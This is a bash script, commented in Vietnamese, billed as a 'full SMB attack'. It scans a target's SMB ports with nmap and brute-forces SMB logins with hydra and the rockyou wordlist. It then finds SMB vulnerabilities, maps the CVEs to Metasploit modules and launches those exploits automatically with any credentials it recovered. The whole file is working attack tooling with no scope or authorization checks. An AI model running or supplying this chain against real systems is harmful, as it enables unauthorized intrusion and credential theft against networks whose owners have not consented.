#!/bin/bash

# =======================
# FULL SMB ATTACK SCRIPT
# =======================

# Màu chữ
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

TARGET=$1
WORDLIST_USER="/usr/share/wordlists/smb_users.txt"
WORDLIST_PASS="/usr/share/wordlists/rockyou.txt"
REPORT_DIR="smb_report"
LOG_FILE="$REPORT_DIR/smb_full_attack.log"
HTML_REPORT="$REPORT_DIR/report.html"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p $REPORT_DIR

echo -e "${YELLOW}[*] Bắt đầu full-chain SMB attack trên $TARGET...${NC}" | tee -a $LOG_FILE

# 1. Quét SMB service
echo -e "${GREEN}[*] Đang quét cổng SMB...${NC}" | tee -a $LOG_FILE
nmap -p 139,445 $TARGET -oN $REPORT_DIR/smb_ports.txt

# 2. Brute-force SMB user/pass
echo -e "${GREEN}[*] Brute-force SMB credentials...${NC}" | tee -a $LOG_FILE
hydra -L $WORDLIST_USER -P $WORDLIST_PASS smb://$TARGET -V -f -o $REPORT_DIR/smb_creds.txt

# Lấy user/pass nếu có
if grep -q "login:" $REPORT_DIR/smb_creds.txt; then
    SMB_USER=$(grep "login:" $REPORT_DIR/smb_creds.txt | head -n1 | awk '{print $4}')
    SMB_PASS=$(grep "login:" $REPORT_DIR/smb_creds.txt | head -n1 | awk '{print $6}')
    echo -e "${RED}[+] Tìm thấy SMB creds: $SMB_USER / $SMB_PASS${NC}" | tee -a $LOG_FILE
else
    echo -e "${YELLOW}[!] Không tìm thấy SMB credentials. Tiếp tục khai thác Anonymous...${NC}" | tee -a $LOG_FILE
    SMB_USER=""
    SMB_PASS=""
fi

# 3. Quét lỗ hổng SMB
echo -e "${GREEN}[*] Quét lỗ hổng SMB...${NC}" | tee -a $LOG_FILE
nmap -p 139,445 --script smb-vuln* $TARGET -oN $REPORT_DIR/smb_vulns.txt

# 4. Trích xuất CVE
grep -Eo "CVE-[0-9]{4}-[0-9]{4,7}" $REPORT_DIR/smb_vulns.txt | sort -u > $REPORT_DIR/smb_cve.txt

# 5. Khai thác với Metasploit nếu có module
while read CVE; do
    echo -e "\n${GREEN}[+] Kiểm tra CVE: $CVE${NC}" | tee -a $LOG_FILE
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')

    if [ -n "$MODULES" ]; then
        echo -e "${RED}[CRITICAL] Tìm thấy module Metasploit: ${MODULES}${NC}" | tee -a $LOG_FILE
        echo -e "${YELLOW}[*] Tự động khai thác...${NC}" | tee -a $LOG_FILE

        msfconsole -q -x "
            use $MODULES;
            set RHOSTS $TARGET;
            set SMBUser '$SMB_USER';
            set SMBPass '$SMB_PASS';
            set LHOST 0.0.0.0;
            run;
            exit;
        " | tee -a $LOG_FILE
    else
        echo -e "${YELLOW}[!] Không có module Metasploit cho $CVE${NC}" | tee -a $LOG_FILE
    fi
done < $REPORT_DIR/smb_cve.txt

# 6. Xuất HTML report
echo "<html><body><h1>SMB Full Attack Report - $TARGET</h1><pre>" > $HTML_REPORT
cat $LOG_FILE >> $HTML_REPORT
echo "</pre></body></html>" >> $HTML_REPORT

echo -e "${GREEN}[+] Báo cáo đã lưu tại: $HTML_REPORT${NC}"
